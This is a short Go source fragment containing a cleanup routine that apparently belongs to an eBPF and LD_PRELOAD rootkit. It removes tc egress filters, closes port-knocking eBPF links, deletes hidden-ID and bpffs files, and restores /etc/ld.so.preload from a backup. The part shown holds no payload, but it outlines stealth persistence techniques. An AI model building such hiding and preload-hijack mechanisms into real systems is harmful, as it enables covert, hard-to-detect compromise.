package main

import (
	"os"
	"os/exec"
)

func doCleanup() {
	_ = exec.Command("tc", "filter", "del", "dev", cleanupIface, "egress").Run()
	_ = exec.Command("tc", "qdisc", "del", "dev", cleanupIface, "clsact").Run()
	if cleanupHold != nil {
		for _, l := range cleanupHold.knockLinks {
			l.Close()
		}
		if cleanupHold.knockColls != nil {
			for _, c := range cleanupHold.knockColls {
				c.Close()
			}
		}
	}
	_ = os.RemoveAll(bpffsFire)
	_ = os.Remove(bpfHideIdsFile)

	if data, err := os.ReadFile(ldPreloadBak); err == nil {
		_ = os.WriteFile("/etc/ld.so.preload", data, 0644)
		_ = os.Remove(ldPreloadBak)
	}
	_ = os.Remove(libldPath)
}
